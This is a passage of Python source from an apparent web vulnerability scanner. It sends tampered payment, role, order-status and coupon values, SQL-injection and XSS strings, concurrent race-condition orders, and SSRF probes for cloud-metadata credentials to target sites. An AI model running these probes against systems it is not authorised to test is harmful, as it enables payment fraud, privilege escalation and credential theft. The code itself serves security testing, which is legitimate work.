            # 0x30 0x0c 0x02 0x01 0x01 0x60 0x07 0x02 0x01 0x03 0x04 0x00 0x80 0x00
            bind_request = bytes.fromhex('300c020101600702010304008000')
            writer.write(bind_request)
            await writer.drain()

            response = await asyncio.wait_for(reader.read(1024), timeout=5)
            writer.close()
            await writer.wait_closed()

            # 检查是否绑定成功
            # 成功的绑定响应通常以 0x30 0x0c 0x02 0x01 0x01 开头
            if response and len(response) > 5:
                if response[0] == 0x30 and response[2] == 0x02:
                    return {
                        'type': 'LDAP 匿名绑定允许',
                        'severity': 'Medium',
                        'evidence': f'LDAP {host}:{port} 允许匿名绑定',
                        'recommendation': '禁用 LDAP 匿名绑定'
                    }

        except BaseException:
            logger.debug("suppressed exception (engine audit)")

        return None


# ============================================================
# 导出（中间定义，最终 __all__ 见文件末尾）
# ============================================================

# ============================================================
# 合并自: engines/misc_engines.py
# ============================================================

# engines/misc_engines.py
"""
合并杂项引擎模块
功能：业务逻辑、信息泄露 检测
修复：
1. InfoLeakEngine 敏感信息正则收紧（aws_secret 要求大小写混合、排除纯十六进制）
2. 增加 Base64 图片数据预过滤
3. aws_secret 无 aws_key 佐证时自动降级为低置信度
4. 增加误报白名单过滤
"""


# ============================================================
# 业务逻辑引擎 (BusinessLogicEngine) - 完整实现
# ============================================================

PAYMENT_AMOUNT_PARAMS = [
    "amount", "price", "total", "cost", "fee", "money", "amt", "value",
    "subtotal", "discount", "tip", "deposit", "tax", "shipping", "handling",
    "grand_total", "balance", "credit", "withdraw", "transfer"
]
PAYMENT_QTY_PARAMS = ["quantity", "qty", "count", "num", "units", "items", "stock", "inventory"]
ROLE_PARAMS = ["role", "level", "group", "permission", "privilege", "access", "type", "user_type",
               "is_admin", "admin", "is_staff", "is_manager", "is_superuser", "user_group", "member_type"]
STATUS_PARAMS = ["status", "state", "order_status", "payment_status", "is_paid", "is_verified", "is_approved"]
ORDER_PARAMS = ["order_id", "orderid", "order", "invoice", "invoice_id", "payment_id", "transaction_id", "ref_id"]
COUPON_PARAMS = ["coupon", "voucher", "promo", "promo_code", "discount_code", "gift_card", "redeem_code"]
BATCH_PARAMS = ["ids", "items", "selected", "checked", "batch", "bulk", "multiple", "all", "list"]

BUSINESS_KEYWORDS = [
    "/pay", "/payment", "/order", "/orders", "/checkout", "/cart", "/invoice",
    "/transaction", "/charge", "/purchase", "/withdraw", "/transfer",
    "/apply", "/redeem", "/claim", "/bonus", "/reward", "/discount", "/coupon",
    "/subscribe", "/subscription", "/renew", "/cancel", "/refund", "/deposit",
    "/balance", "/credit", "/wallet", "/profile", "/account", "/settings",
    "/api/v1", "/api/v2", "/api/v3"
]

def _build_cloud_metadata():
    """P1-5：云厂商 IMDS 端点从统一权威清单按厂商派生，消除三处硬编码不一致。

    返回 {厂商: [url,...]}，与旧结构（dict[厂商, List[url]]）兼容，business_logic 引擎
    遍历 .items() 消费时无需改动。
    """
    from vulnclaw.core.utils import CLOUD_METADATA_ENDPOINTS
    buckets = {"aws": [], "gcp": [], "azure": [], "aliyun": [], "tencent": [], "openstack": []}
    for url, _label in CLOUD_METADATA_ENDPOINTS:
        u = url.lower()
        if "metadata.google.internal" in u:
            buckets["gcp"].append(url)
        elif "100.100.100.200" in u:
            buckets["aliyun"].append(url)
        elif "openstack" in u:
            buckets["openstack"].append(url)
        elif "/metadata/instance" in u and "169.254.169.254" in u:
            buckets["azure"].append(url)
        elif "metadata/v1/" in u and "169.254.169.254" in u:
            buckets["tencent"].append(url)
        elif "169.254.169.254" in u:
            buckets["aws"].append(url)
        else:
            buckets.setdefault("other", []).append(url)
    return {k: v for k, v in buckets.items() if v}


CLOUD_METADATA = _build_cloud_metadata()

RACE_KEYWORDS = ["order", "checkout", "purchase", "buy", "claim", "redeem", "withdraw", "transfer", "apply", "submit", "create", "update", "delete", "cancel", "refund", "lottery", "draw", "raffle", "giveaway", "bonus", "reward", "cashback", "discount"]

# 业务流程阶段分类（v103 AI 流程分析用）
BUSINESS_FLOW_STAGES = {
    "登录/认证": ["/login", "/signin", "/signup", "/register", "/auth", "/oauth", "/forgot"],
    "浏览/选品": ["/product", "/catalog", "/search", "/list", "/browse", "/cart"],
    "结算/下单": ["/checkout", "/order", "/confirm", "/submit", "/purchase", "/place-order"],
    "支付": ["/pay", "/payment", "/charge", "/invoice", "/transaction"],
    "成功/完成": ["/success", "/complete", "/thank", "/done", "/confirmed", "/result"],
    "订单管理": ["/my-order", "/myorder", "/order-history", "/track", "/orders"],
    "账户/敏感": ["/profile", "/account", "/settings", "/admin", "/user", "/balance", "/wallet"],
    "优惠/营销": ["/coupon", "/promo", "/discount", "/voucher", "/reward", "/points"],
}


class BusinessLogicEngine(BaseEngine):
    """业务逻辑漏洞检测引擎 V3.0 - 终极整合版

    能力边界声明（2026-09-15 评审补录）
    - can_detect: 覆盖支付金额/数量、角色、状态、订单、优惠券等业务参数篡改检测，以及端点发现与 API 流程顺序逻辑；可启用 AI 辅助业务逻辑分析（ENABLE_BUSINESS_AI_ANALYSIS）。
    - cannot_detect: 需多用户会话/登录态协同的复杂竞争条件与重放链条覆盖有限；后端不校验导致的等价于常规越权的场景需业务上下文判断；无法枚举的私有业务接口会漏。
    - 前置条件: 请求参数能通过业务参数识别门禁；存在可观测的响应差异/状态流转；AI 辅助分析需对应开关开启（否则仅基础规则）。
    """

    name = "business_logic"
    description = "业务逻辑漏洞检测引擎 V3.0（终极整合版）"

    priority_params = (
        PAYMENT_AMOUNT_PARAMS + PAYMENT_QTY_PARAMS + ROLE_PARAMS
        + STATUS_PARAMS + ORDER_PARAMS + COUPON_PARAMS + BATCH_PARAMS
    )

    def __init__(self):
        super().__init__()
        self._discovered_endpoints: Set[str] = set()
        self._api_flow_cache: Dict[str, List[str]] = {}
        self._context_store: Dict[str, str] = {}
        self._param_explorer_results: Set[str] = set()
        # v103: AI 辅助业务逻辑分析开关（默认开启，可用环境变量 ENABLE_BUSINESS_AI_ANALYSIS=false 关闭）
        self._enable_ai_analysis = os.getenv("ENABLE_BUSINESS_AI_ANALYSIS", "true").lower() == "true"

    # ============================================================
    # 主检测入口（check）
    # ============================================================

    async def check(
        self,
        url: str,
        param: str,
        normal_resp: Tuple[int, str, Dict],
        parsed_query: str,
        session,
        **kwargs
    ) -> Optional[Dict]:
        """检测单个参数的业务逻辑漏洞"""
        if not await self._is_business_param(url, param):
            return None

        param_lower = param.lower()
        findings = []

        # 各类检测（按优先级排序）
        if any(p in param_lower for p in PAYMENT_AMOUNT_PARAMS):
            result = await self._check_payment_amount(url, param, normal_resp, parsed_query, session)
            if result:
                findings.append(result)

        if any(p in param_lower for p in ROLE_PARAMS):
            result = await self._check_role_bypass(url, param, normal_resp, parsed_query, session)
            if result:
                findings.append(result)

        if any(p in param_lower for p in STATUS_PARAMS):
            result = await self._check_status_manipulation(url, param, normal_resp, parsed_query, session)
            if result:
                findings.append(result)

        if any(p in param_lower for p in ORDER_PARAMS):
            result = await self._check_order_enumeration(url, param, normal_resp, parsed_query, session)
            if result:
                findings.append(result)

        if any(p in param_lower for p in COUPON_PARAMS):
            result = await self._check_coupon_abuse(url, param, normal_resp, parsed_query, session)
            if result:
                findings.append(result)

        if any(p in param_lower for p in BATCH_PARAMS):
            result = await self._check_batch_operation(url, param, normal_resp, parsed_query, session)
            if result:
                findings.append(result)

        if any(p in param_lower for p in PAYMENT_QTY_PARAMS):
            result = await self._check_qty_overflow(url, param, normal_resp, parsed_query, session)
            if result:
                findings.append(result)

        # 参数污染
        result = await self._check_param_pollution(url, param, normal_resp, parsed_query, session)
        if result:
            findings.append(result)

        # 返回最高危的发现
        if findings:
            findings.sort(key=lambda x: {"Critical": 0, "High": 1, "Medium": 2, "Low": 3}.get(x.get("severity", "Low"), 4))
            return findings[0]

        return None

    # ============================================================
    # 全局扫描（scan）—— 包含所有增强检测
    # ============================================================

    async def scan(self, target: str, session, **kwargs) -> List[Dict]:
        """全局扫描：参数检测 + 流程绕过 + 竞态条件 + 云检测"""
        findings = []
        parsed = urlparse(target)
        base = f"{parsed.scheme}://{parsed.netloc}"
        timeout = getattr(settings, 'timeout', 30)

        logger.info(f"🔐 [BusinessLogic V3] 终极业务逻辑扫描: {target}")

        # ===== 1. 参数检测（基于 URL 参数） =====
        qs = parse_qs(parsed.query)
        if qs:
            try:
                normal_resp = await async_get(target, session=session, timeout=timeout)
            except BaseException:
                normal_resp = (200, "", {})
            for param in qs.keys():
                result = await self.check(
                    url=target,
                    param=param,
                    normal_resp=normal_resp,
                    parsed_query=parsed.query,
                    session=session
                )
                if result:
                    findings.append(result)

        # ===== 2. 流程绕过检测（直接访问成功页/2FA绕过） =====
        flow_results = await self._scan_flow_bypass(base, session)
        findings.extend(flow_results)

        # ===== 3. 竞态条件检测 =====
        if any(kw in target.lower() for kw in RACE_KEYWORDS):
            race_results = await self._scan_race_conditions(target, session)
            findings.extend(race_results)

        # ===== 4. 云环境检测（SSRF到元数据 + S3公开） =====
        cloud_results = await self._scan_cloud_vulns(target, session)
        findings.extend(cloud_results)

        # ===== 5. 状态机检测 =====
        state_results = await self._scan_state_machine(target, session)
        findings.extend(state_results)

        # ===== 6. 参数深度探索（从HTML/JS/Burp提取） =====
        explorer_results = await self._param_explorer(target, session)
        if explorer_results:
            findings.extend(explorer_results)

        # ===== 7. AI 辅助业务流程分析（v103，默认开启） =====
        if self._get_ai_enabled(kwargs):
            ai_results = await self._ai_flow_analysis(base, session, **kwargs)
            if ai_results:
                findings.extend(ai_results)

        logger.info(f"   ✅ BusinessLogic V3 完成，发现 {len(findings)} 个问题")
        return findings

    # ============================================================
    # 各检测方法实现（完整）
    # ============================================================

    async def _check_payment_amount(self, url, param, normal_resp, parsed_query, session) -> Optional[Dict]:
        original_value = self._get_param_value(url, param, parsed_query)
        if not original_value:
            return None
        normal_text = self._get_normal_text(normal_resp)
        timeout = getattr(settings, 'timeout', 30)

        payloads = [
            ("-1", "负数"), ("-9999", "负极大"), ("0", "零"), ("999999999", "极大值"),
            ("0.001", "极小精度"), ("1.000000001", "精度溢出"), ("1e9", "科学计数法"),
            ("1.5", "小数"), ("-0.01", "负小数"), ("null", "null"), ("undefined", "undefined"),
            ("Infinity", "无穷大"), ("NaN", "非数字"), ("true", "布尔"), ("1%2e00", "编码绕过"),
            ("1' OR '1'='1", "SQL混合"), ("<script>alert(1)</script>", "XSS混合")
        ]

        for payload, desc in payloads:
            attack_url = build_attack_url(url, param, payload, parsed_query)
            try:
                resp = await async_get(attack_url, session=session, timeout=timeout)
                status, text = self._parse_response(resp)
                if status == 200 and len(text) > 100:
                    amount_keywords = ['total', 'price', 'amount', 'balance', '$', '¥', '€']
                    if any(kw in text.lower() for kw in amount_keywords):
                        diff_ratio = abs(len(text) - len(normal_text)) / max(1, len(normal_text))
                        if diff_ratio > 0.15:
                            import re
                            if re.search(r'\d+\.?\d*', text):
                                return {
                                    'url': url, 'parameter': param, 'payload': payload,
                                    'type': f'业务逻辑-支付金额篡改({desc})',
                                    'severity': 'Critical', 'ai_verdict': '高',
                                    'evidence': f'金额参数 {param} 篡改为 {payload}，响应含金额信息',
                                    'method': 'amount_tamper'
                                }
            except BaseException:
                logger.debug("suppressed exception (engine audit)")
        return None

    async def _check_role_bypass(self, url, param, normal_resp, parsed_query, session) -> Optional[Dict]:
        original_value = self._get_param_value(url, param, parsed_query)
        if not original_value or original_value.lower() in ("admin", "root", "superadmin"):
            return None
        normal_text = self._get_normal_text(normal_resp)
        timeout = getattr(settings, 'timeout', 30)

        payloads = [
            ("admin", "管理员"), ("root", "root"), ("superadmin", "超级管理员"),
            ("1", "数字1"), ("true", "布尔"), ("[admin]", "数组"), ('{"role":"admin"}', "JSON"),
            ("Admin", "大小写"), ("ADMIN", "全大写"), ("staff", "员工"), ("manager", "经理")
        ]
        admin_indicators = ["dashboard", "admin", "manage", "permission", "users", "config", "system"]

        for payload, desc in payloads:
            attack_url = build_attack_url(url, param, payload, parsed_query)
            try:
                resp = await async_get(attack_url, session=session, timeout=timeout)
                status, text = self._parse_response(resp)
                if status == 200:
                    admin_score = sum(1 for ind in admin_indicators if ind in text.lower())
                    if admin_score >= 2:
                        abs(len(text) - len(normal_text)) / max(1, len(normal_text))
                        return {
                            'url': url, 'parameter': param, 'payload': payload,
                            'type': f'业务逻辑-权限提升({desc})',
                            'severity': 'Critical', 'ai_verdict': '高',
                            'evidence': f'角色参数改为 {payload}，出现 {admin_score} 个管理特征',
                            'method': 'role_bypass'
                        }
                    if '"is_admin": true' in text or '"admin": true' in text:
                        return {
                            'url': url, 'parameter': param, 'payload': payload,
                            'type': f'业务逻辑-权限提升(JSON){desc}',
                            'severity': 'Critical', 'ai_verdict': '高',
                            'evidence': f'响应返回管理员权限字段: {text[:200]}',
                            'method': 'role_bypass_json'
                        }
            except BaseException:
                logger.debug("suppressed exception (engine audit)")
        return None

    async def _check_status_manipulation(self, url, param, normal_resp, parsed_query, session) -> Optional[Dict]:
        original_value = self._get_param_value(url, param, parsed_query)
        if not original_value:
            return None
        timeout = getattr(settings, 'timeout', 30)
        payloads = [
            ("paid", "已支付"), ("completed", "已完成"), ("approved", "已批准"),
            ("confirmed", "已确认"), ("active", "已激活"), ("verified", "已验证"),
            ("1", "数字1"), ("true", "布尔")
        ]
        for payload, desc in payloads:
            attack_url = build_attack_url(url, param, payload, parsed_query)
            try:
                resp = await async_get(attack_url, session=session, timeout=timeout)
                status, text = self._parse_response(resp)
                if status == 200:
                    if any(kw in text.lower() for kw in ["success", "updated", "saved"]):
                        if payload in text or payload.lower() in text.lower():
                            return {
                                'url': url, 'parameter': param, 'payload': payload,
                                'type': f'业务逻辑-状态篡改({desc})',
                                'severity': 'High', 'ai_verdict': '高',
                                'evidence': f'状态参数 {param} 从 {original_value} 改为 {payload}',
                                'method': 'status_manipulation'
                            }
            except BaseException:
                logger.debug("suppressed exception (engine audit)")
        return None

    async def _check_order_enumeration(self, url, param, normal_resp, parsed_query, session) -> Optional[Dict]:
        original_value = self._get_param_value(url, param, parsed_query)
        if not original_value:
            return None
        normal_text = self._get_normal_text(normal_resp)
        timeout = getattr(settings, 'timeout', 30)

        mutations = []
        if original_value.isdigit():
            num = int(original_value)
            for offset in [1, 2, 3, 5, 10, 100]:
                if num > offset:
                    mutations.append(str(num - offset))
                mutations.append(str(num + offset))
            mutations.extend(["0", "1", "999999", "000001"])
        if re.match(r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$', original_value, re.I):
            import uuid
            mutations.extend([str(uuid.uuid4()), "00000000-0000-0000-0000-000000000000"])
        if re.match(r'^[A-Za-z0-9+/=]+$', original_value) and len(original_value) >= 16:
            mutations.append(original_value[:-1] + 'A')
            mutations.append(original_value + 'A')

        mutations = list(dict.fromkeys(mutations))[:15]
        if original_value in mutations:
            mutations.remove(original_value)

        for mutated in mutations:
            attack_url = build_attack_url(url, param, mutated, parsed_query)
            try:
                resp = await async_get(attack_url, session=session, timeout=timeout)
                status, text = self._parse_response(resp)
                if status == 200 and len(text) > 50:
                    order_keywords = ["order", "invoice", "payment", "transaction", "customer", "email"]
                    if any(kw in text.lower() for kw in order_keywords):
                        if text != normal_text and len(text) > len(normal_text) * 0.5:
                            return {
                                'url': url, 'parameter': param, 'payload': mutated,
                                'type': '业务逻辑-订单枚举(IDOR)',
                                'severity': 'High', 'ai_verdict': '高',
                                'evidence': f'订单ID {param} 从 {original_value} 改为 {mutated}，返回不同订单信息',
                                'method': 'order_enumeration'
                            }
            except BaseException:
                logger.debug("suppressed exception (engine audit)")
        return None

    async def _check_coupon_abuse(self, url, param, normal_resp, parsed_query, session) -> Optional[Dict]:
        original_value = self._get_param_value(url, param, parsed_query)
        if not original_value:
            return None
        timeout = getattr(settings, 'timeout', 30)
        payloads = [
            ("TEST", "测试"), ("DISCOUNT", "通用"), ("FREE", "免费"), ("0", "0元"),
            ("-100", "负100%"), ("999999", "极大"), ("*", "通配符"), ("admin", "管理员券")
        ]
        for payload, desc in payloads:
            attack_url = build_attack_url(url, param, payload, parsed_query)
            try:
                resp = await async_get(attack_url, session=session, timeout=timeout)
                status, text = self._parse_response(resp)
                if status == 200:
                    if any(kw in text.lower() for kw in ["applied", "valid", "success", "discount"]):
                        import re
                        if re.search(r'\d+\.?\d*', text):
                            return {
                                'url': url, 'parameter': param, 'payload': payload,
                                'type': f'业务逻辑-优惠券滥用({desc})',
                                'severity': 'High', 'ai_verdict': '高',
                                'evidence': f'优惠券 {param}={payload} 被接受，响应含折扣信息',
                                'method': 'coupon_abuse'
                            }
            except BaseException:
                logger.debug("suppressed exception (engine audit)")
        return None

    async def _check_batch_operation(self, url, param, normal_resp, parsed_query, session) -> Optional[Dict]:
        original_value = self._get_param_value(url, param, parsed_query)
        if not original_value:
            return None
        timeout = getattr(settings, 'timeout', 30)
        payloads = [
            ("all", "全部"), ("*", "通配符"), ("1,2,3,4,5", "批量ID"),
            ("1;2;3", "分号分隔"), ("[\"1\",\"2\"]", "JSON数组"), ("1", "单ID")
        ]
        for payload, desc in payloads:
            attack_url = build_attack_url(url, param, payload, parsed_query)
            try:
                resp = await async_get(attack_url, session=session, timeout=timeout)
                status, text = self._parse_response(resp)
                if status == 200:
                    if any(kw in text.lower() for kw in ["deleted", "updated", "success", "processed"]):
                        if len(text) > 50:
                            return {
                                'url': url, 'parameter': param, 'payload': payload,
                                'type': f'业务逻辑-批量操作越权({desc})',
                                'severity': 'High', 'ai_verdict': '高',
                                'evidence': f'批量操作参数 {param}={payload} 被接受',
                                'method': 'batch_bypass'
                            }
            except BaseException:
                logger.debug("suppressed exception (engine audit)")
        return None

    async def _check_qty_overflow(self, url, param, normal_resp, parsed_query, session) -> Optional[Dict]:
        original_value = self._get_param_value(url, param, parsed_query)
        if not original_value:
            return None
        timeout = getattr(settings, 'timeout', 30)
        payloads = [("-1", "负数"), ("999999", "极大值"), ("0.5", "小数"), ("-0.5", "负小数")]
        for payload, desc in payloads:
            attack_url = build_attack_url(url, param, payload, parsed_query)
            try:
                resp = await async_get(attack_url, session=session, timeout=timeout)
                status, text = self._parse_response(resp)
                if status == 200 and len(text) > 100:
                    if "error" not in text.lower():
                        return {
                            'url': url, 'parameter': param, 'payload': payload,
                            'type': f'业务逻辑-数量溢出({desc})',
                            'severity': 'High', 'ai_verdict': '高',
                            'evidence': f'数量参数 {param} 改为 {payload}，服务器接受',
                            'method': 'qty_overflow'
                        }
            except BaseException:
                logger.debug("suppressed exception (engine audit)")
        return None

    async def _check_param_pollution(self, url, param, normal_resp, parsed_query, session) -> Optional[Dict]:
        timeout = getattr(settings, 'timeout', 30)
        parsed = urlparse(url)
        qs = parse_qs(parsed.query)
        if param not in qs:
            return None
        test_qs = qs.copy()
        test_qs[param] = [qs[param][0], 'pollution_test']
        new_query = urlencode(test_qs, doseq=True)
        attack_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))
        try:
            resp = await async_get(attack_url, session=session, timeout=timeout)
            status, text = self._parse_response(resp)
            if status == 200 and 'pollution_test' in text:
                return {
                    'url': url, 'parameter': param,
                    'type': '业务逻辑-参数污染',
                    'severity': 'Medium', 'ai_verdict': '中',
                    'evidence': f'参数 {param} 被重复添加，两个值都被处理',
                    'method': 'param_pollution'
                }
        except BaseException:
            logger.debug("suppressed exception (engine audit)")
        return None

    async def _scan_flow_bypass(self, base_url: str, session) -> List[Dict]:
        findings = []
        timeout = getattr(settings, 'timeout', 30)

        success_paths = ["/payment/success", "/checkout/success", "/order/complete", "/success", "/thank-you", "/confirmed"]
        for path in success_paths:
            test_url = base_url + path
            try:
                resp = await async_get(test_url, session=session, timeout=timeout)
                status, text = self._parse_response(resp)
                if status == 200:
                    success_keywords = ["success", "thank", "complete", "confirmed", "order", "payment"]
                    if any(kw in text.lower() for kw in success_keywords):
                        if "login" not in text.lower() and "sign in" not in text.lower():
                            findings.append({
                                'url': test_url,
                                'type': '业务逻辑-流程绕过(成功页)',
                                'severity': 'Critical',
                                'ai_verdict': '高',
                                'evidence': f'无需前置流程即可访问 {path}，包含成功标志',
                                'method': 'flow_bypass'
                            })
            except BaseException:
                logger.debug("suppressed exception (engine audit)")

        # 2FA绕过检测 - 三前置条件
        # 条件1：站点存在2FA迹象（检测常见2FA相关页面/资源）
        two_fa_indicators = ["/login", "/auth", "/signin", "/2fa", "/mfa", "/verify", "/security", "/settings/security"]
        has_two_fa = False
        for indicator in two_fa_indicators:
            try:
                resp = await async_get(base_url + indicator, session=session, timeout=timeout)
                if resp and resp.status == 200:
                    has_two_fa = True
                    break
            except:
                continue
        
        if not has_two_fa:
            return findings  # 无2FA迹象，跳过检测

        protected_pages = ["/dashboard", "/profile", "/settings", "/admin"]
        for pp in protected_pages:
            test_url = base_url + pp
            try:
                resp = await async_get(test_url, session=session, timeout=timeout)
                status, text = self._parse_response(resp)
                if status == 200:
                    # 条件2：匿名访问确实越权（非SPA壳）
                    from vulnclaw.core.detectors.spa_detector import SpaFingerprintDetector
                    spa_detector = SpaFingerprintDetector(session)
                    await spa_detector.detect(test_url)
                    if spa_detector.get_spa_status():
                        continue  # SPA页面跳过
                    
                    # 条件3：关键词排除导航/模板常亮词
                    exclude_keywords = ["navigation", "template", "layout", "footer", "header", "menu", "sidebar"]
                    if any(kw in text.lower() for kw in exclude_keywords):
                        continue
                    
                    sensitive = ["email", "phone", "balance", "order", "account", "profile", "settings"]
                    if any(kw in text.lower() for kw in sensitive):
                        findings.append({
                            'url': test_url,
                            'type': '业务逻辑-2FA绕过',
                            'severity': 'Medium',  # 降级为Medium，需人工复核
                            'ai_verdict': '中',
                            'evidence': f'检测到2FA迹象，匿名访问{pp}页面包含敏感信息，需人工复核',
                            'method': '2fa_bypass',
                            'recommendation': '确认该页面是否需要2FA验证，检查用户权限控制'
                        })
            except Exception as e:
                logger.debug(f"2FA检测异常: {e}")
                continue
            except BaseException:
                logger.debug("suppressed exception (engine audit)")

        return findings

    async def _scan_race_conditions(self, target: str, session) -> List[Dict]:
        findings = []
        timeout = getattr(settings, 'timeout', 30)
        concurrency = 10

        if "order" in target.lower() or "purchase" in target.lower():
            product_id = self._extract_product_id(target) or "1"
            json_data = {"product_id": product_id, "quantity": 1}
            tasks = [async_post(target, json=json_data, session=session, timeout=timeout) for _ in range(concurrency)]
            responses = await asyncio.gather(*tasks, return_exceptions=True)
            success = sum(1 for r in responses if not isinstance(r, Exception) and self._parse_response(r)[0] == 200)
            if success >= 2:
                findings.append({
                    'url': target,
                    'type': '业务逻辑-竞态条件(库存超卖)',
                    'severity': 'Critical',
                    'ai_verdict': '高',
                    'evidence': f'并发 {concurrency} 次下单，成功 {success} 次，可能超卖',
                    'method': 'stock_race'
                })

        if "coupon" in target.lower() or "redeem" in target.lower():
            json_data = {"coupon_code": "TEST"}
            tasks = [async_post(target, json=json_data, session=session, timeout=timeout) for _ in range(concurrency)]
            responses = await asyncio.gather(*tasks, return_exceptions=True)
            success = sum(1 for r in responses if not isinstance(r, Exception) and "success" in self._parse_response(r)[1].lower())
            if success >= 2:
                findings.append({
                    'url': target,
                    'type': '业务逻辑-竞态条件(优惠券重复使用)',
                    'severity': 'High',
                    'ai_verdict': '高',
                    'evidence': f'并发 {concurrency} 次使用同一优惠券，成功 {success} 次',
                    'method': 'coupon_race'
                })

        return findings

    async def _scan_cloud_vulns(self, target: str, session) -> List[Dict]:
        findings = []
        parsed = urlparse(target)
        qs = parse_qs(parsed.query)
        ssrf_params = ["url", "path", "redirect", "callback", "target", "dest", "source", "file", "load", "fetch"]

        for param in qs.keys():
            if param in ssrf_params:
                for cloud, endpoints in CLOUD_METADATA.items():
                    for endpoint in endpoints:
                        test_url = f"{target}&{param}={endpoint}" if '?' in target else f"{target}?{param}={endpoint}"
                        try:
                            resp = await async_get(test_url, session=session, timeout=5)
                            status, text = self._parse_response(resp)
                            if status == 200 and len(text) > 50:
                                if "ami-id" in text or "instance-id" in text or "security-credentials" in text:
                                    findings.append({
                                        'url': target,
                                        'parameter': param,
                                        'payload': endpoint,
                                        'type': f'云元数据泄露-{cloud}',
                                        'severity': 'Critical',
                                        'ai_verdict': '高',
                                        'evidence': f'通过 SSRF 访问 {cloud} 元数据，返回 {len(text)} 字节',
                                        'method': 'cloud_metadata'
                                    })
                                    break
                        except BaseException:
                            logger.debug("suppressed exception (engine audit)")

        try:
            resp = await async_get(target, session=session, timeout=10)
            text = self._get_response_text(resp)
            s3_pattern = r'([a-zA-Z0-9\-_]+)\.s3\.([a-zA-Z0-9\-]+)\.amazonaws\.com'
            matches = re.findall(s3_pattern, text, re.I)
            for match in matches:
                bucket = match[0]
                list_url = f"https://{bucket}.s3.amazonaws.com/"
                try:
                    list_resp = await async_get(list_url, session=session, timeout=5)
                    list_text = self._get_response_text(list_resp)
                    if "ListBucketResult" in list_text or "Key" in list_text:
                        findings.append({
                            'url': list_url,
                            'type': 'S3存储桶公开',
                            'severity': 'Critical',
                            'ai_verdict': '高',
                            'evidence': f'S3 存储桶 {bucket} 可公开列出',
                            'method': 's3_public'
                        })
                except BaseException:
                    logger.debug("suppressed exception (engine audit)")
        except BaseException:
            logger.debug("suppressed exception (engine audit)")

        return findings

    async def _scan_state_machine(self, target: str, session) -> List[Dict]:
        findings = []
        parsed = urlparse(target)
        qs = parse_qs(parsed.query)

        for param in qs.keys():
            if param in STATUS_PARAMS:
                original_value = qs[param][0]
                for state in ["paid", "completed", "approved", "verified", "shipped"]:
                    if state == original_value.lower():
                        continue
                    test_url = build_attack_url(target, param, state, parsed.query)
                    try:
                        resp = await async_get(test_url, session=session, timeout=5)
                        status, text = self._parse_response(resp)
                        if status == 200 and (state in text.lower() or "success" in text.lower()):
                            findings.append({
                                'url': target,
                                'parameter': param,
                                'payload': state,
                                'type': f'状态机绕过-{state}',
                                'severity': 'Critical',
                                'ai_verdict': '高',
                                'evidence': f'从 {original_value} 直接跳转到 {state}，成功修改',
                                'method': 'state_bypass'
                            })
                    except BaseException:
                        logger.debug("suppressed exception (engine audit)")
        return findings

    async def _param_explorer(self, target: str, session) -> List[Dict]:
        findings = []
        try:
            resp = await async_get(target, session=session, timeout=10)
            text = self._get_response_text(resp)

            input_params = re.findall(r'<input[^>]+name=["\']([^"\']+)["\']', text, re.I)
            json_keys = re.findall(r'"([a-zA-Z_][a-zA-Z0-9_]*)"\s*:', text)
            all_params = set(input_params + json_keys)

            js_urls = re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', text, re.I)
            for js_url in js_urls[:3]:
                full_url = js_url if js_url.startswith('http') else urljoin(target, js_url)
                try:
                    js_resp = await async_get(full_url, session=session, timeout=5)
                    js_text = self._get_response_text(js_resp)
                    js_params = re.findall(r'["\']([a-zA-Z_][a-zA-Z0-9_]*)["\']\s*:', js_text)
                    all_params.update(js_params)
                except BaseException:
                    logger.debug("suppressed exception (engine audit)")

            discovered = [p for p in all_params if len(p) > 1 and not p.startswith('_')]
            if discovered:
                self._param_explorer_results.update(discovered)
                findings.append({
                    'url': target,
                    'type': '参数探索发现',
                    'severity': 'Info',
                    'ai_verdict': '信息',
                    'evidence': f'发现隐藏参数: {", ".join(list(discovered)[:10])}',
                    'method': 'param_explorer'
                })
        except BaseException:
            logger.debug("suppressed exception (engine audit)")
        return findings

    # ============================================================
    # 辅助方法
    # ============================================================

    async def _is_business_param(self, url: str, param: str) -> bool:
        param_lower = param.lower()
        all_business = PAYMENT_AMOUNT_PARAMS + PAYMENT_QTY_PARAMS + ROLE_PARAMS + STATUS_PARAMS + ORDER_PARAMS + COUPON_PARAMS + BATCH_PARAMS
        if param_lower in all_business:
            return True
        if any(kw in url.lower() for kw in BUSINESS_KEYWORDS):
            return True
        return False

    def _get_param_value(self, url: str, param: str, parsed_query: str) -> Optional[str]:
        parsed = urlparse(url)
        qs = parse_qs(parsed.query)
        if not qs and parsed_query:
            qs = parse_qs(parsed_query)
        if param in qs and qs[param]:
            return qs[param][0]
        return None

    def _parse_response(self, resp):
        if isinstance(resp, tuple):
            return resp[0], resp[1] if resp[1] else ""
        from vulnclaw.core.utils import sync_resp_text
        return resp.status, sync_resp_text(resp)

    def _get_normal_text(self, normal_resp):
        if isinstance(normal_resp, tuple):
            return normal_resp[1] if len(normal_resp) > 1 else ""
        from vulnclaw.core.utils import sync_resp_text
        return sync_resp_text(normal_resp)

    def _get_response_text(self, resp):
        if isinstance(resp, tuple):
            return resp[1] if len(resp) > 1 else ""
        from vulnclaw.core.utils import sync_resp_text
        return sync_resp_text(resp)

    def _extract_product_id(self, url: str) -> Optional[str]:
        parsed = urlparse(url)
        qs = parse_qs(parsed.query)
        for p in ["product_id", "product", "id", "sku"]:
            if p in qs and qs[p]:
                return qs[p][0]
        return None

    # ============================================================
    # AI 辅助业务逻辑分析（v103）
    # ============================================================

    def _get_ai_enabled(self, kwargs: Dict = None) -> bool:
        """AI 业务逻辑分析开关（默认开启；kwargs['enable_ai'] 可覆盖）"""
        if kwargs is not None and "enable_ai" in kwargs:
            return bool(kwargs.get("enable_ai"))
        return self._enable_ai_analysis

    def _collect_api_sequence(self, context) -> List[Dict]:
        """从扫描上下文中提取 API 调用序列（去重 + 截断，供 AI 流程分析）"""
        sequence: List[Dict] = []
        seen: Set[str] = set()

        def _add(url, source, status=None, role="", params=None, text="", headers=None):
            if not url or not isinstance(url, str):
                return
            if not url.startswith(("http://", "https://")):
                return
            key = f"{source}:{url}"
            if key in seen:
                return
            seen.add(key)
            sequence.append({
                "url": url[:300],
                "source": source,
                "status": status,
                "role": role or "",
                "params": params or {},
                "text_len": len(text or ""),
                "headers": headers or {},
            })

        if context is None:
            return sequence

        # 1. recon 发现的 API
        for api in getattr(context, "discovered_apis", []) or []:
            if isinstance(api, str):
                _add(api, "recon_api")
